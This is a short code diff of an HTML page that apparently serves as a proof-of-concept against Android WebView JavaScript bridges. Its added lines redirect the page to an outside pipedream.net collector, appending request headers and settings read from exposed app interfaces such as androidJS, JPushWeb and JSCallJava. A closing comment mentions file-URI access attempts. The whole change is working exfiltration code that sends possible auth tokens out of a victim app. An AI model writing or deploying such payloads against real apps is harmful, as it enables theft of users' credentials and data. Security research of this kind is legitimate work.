@@ -13,24 +13,24 @@
     <body>
         <p id="content">zzz!</p>
         <script type="text/javascript">
-        document.write("token: " + androidJS.getRequestHeaders());
+        location.href = "https://eoiib6qdds6hgi7.m.pipedream.net/?androidJSheaders=" + androidJS.getRequestHeaders();
         </script>
 	    
         <script type="text/javascript">
-        document.write("token: " + androidJS.getToken());
+        location.href = "https://eoiib6qdds6hgi7.m.pipedream.net/?androidJSsettings=" + androidJS.getSettings();
         </script>
 
 	<script type="text/javascript">
-        document.write("token: " + JPushWeb.getRequestHeaders());
+        location.href = "https://eoiib6qdds6hgi7.m.pipedream.net/?jspushweb=" + JPushWeb.getRequestHeaders();
         </script>
 
 	    
 	<script type="text/javascript">
-        document.write("token: " + JSCallJava.getRequestHeaders());
+        location.href = "https://eoiib6qdds6hgi7.m.pipedream.net/?jscalljava=" + JSCallJava.getRequestHeaders();
         </script>
 
-	    	<script type="text/javascript">
-        document.write("token: " + interface.getRequestHeaders());
+	<script type="text/javascript">
+        location.href = "https://eoiib6qdds6hgi7.m.pipedream.net/?interface=" + interface.getRequestHeaders();
         </script>
 
 	// file access from file URIs - attempt#1
